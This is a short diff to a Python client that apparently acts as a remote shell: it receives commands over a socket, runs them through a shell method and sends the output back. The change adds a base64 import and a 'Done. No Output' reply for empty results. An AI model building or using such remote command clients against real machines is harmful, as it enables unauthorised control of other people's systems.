@@ -12,7 +12,7 @@ from os import remove
 import json
 import platform
 import pathlib
-
+import base64
 
 class CommandHandler():
     def connectionCheck(self) -> str:
@@ -80,7 +80,11 @@ class Client(CommandHandler):
                     if data.decode() == 'exit':
                         break
                     result = self.shell(data.decode(), self.sock)
-                    self.sock.send(result)
+                    print(result)
+                    if result.decode() != "":
+                        self.sock.send(result)
+                    else:
+                        self.sock.send(str.encode("Done. No Output"))
 
 def main():
     Client()
